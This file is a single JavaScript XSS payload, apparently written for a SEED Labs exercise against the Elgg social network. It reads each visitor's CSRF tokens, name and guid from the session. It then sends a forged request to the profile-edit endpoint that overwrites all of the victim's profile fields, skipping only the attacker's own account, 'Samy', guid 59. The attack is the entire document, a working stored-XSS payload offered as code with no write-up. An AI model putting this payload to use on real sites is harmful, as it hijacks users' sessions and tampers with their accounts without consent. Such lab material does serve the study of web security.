<script type="text/javascript"> 
	window.onload = function() {
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	
	var userName=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;

	var description = "&description=1905047";
	var accesslevel0 = "&accesslevel[description]=1";

	var briefdescription = "&briefdescription=nothing in briefdescription"
	var accesslevel1 = "&accesslevel[briefdescription]=1";

	var location = "&location=nothing in garbage"
	var accesslevel2 = "&accesslevel[location]=1";


	var interests = "&interests=Samy say garbage";
	var accesslevel3= "&accesslevel[interests]=1"
   
	var skills = "&skills=Samy say interest";
	var accesslevel4= "&accesslevel[skills]=1"

	var contactemail = "&contactemail=Samy say garbage";
	var accesslevel5= "&accesslevel[contactemail]=1"

	var phone = "&phone=Samy say garbage";
	var accesslevel6= "&accesslevel[phone]=1"

	var mobile = "&mobile=Samy say garbage";
	var accesslevel7= "&accesslevel[mobile]=1"

	var website = "&website=Samy say garbage";
	var accesslevel8= "&accesslevel[website]=1"

	var twitter = "&twitter=Samy say garbage";
	var accesslevel9= "&accesslevel[twitter]=1"

	
	
	//Construct the content of your url.
	var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content=token + ts + userName + description + accesslevel0 +
	 briefdescription + accesslevel1  + 
	 location + accesslevel2 +
	 interests +accesslevel3 +
	 skills + accesslevel4 +
	 contactemail + accesslevel5 +
	 phone + accesslevel6 +
	 mobile + accesslevel7 +
	 website + accesslevel8 +
	 twitter + accesslevel9 +
	 guid; //FILL IN
	
    samyId=59
	if(elgg.session.user.guid!=samyId)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

}
</script>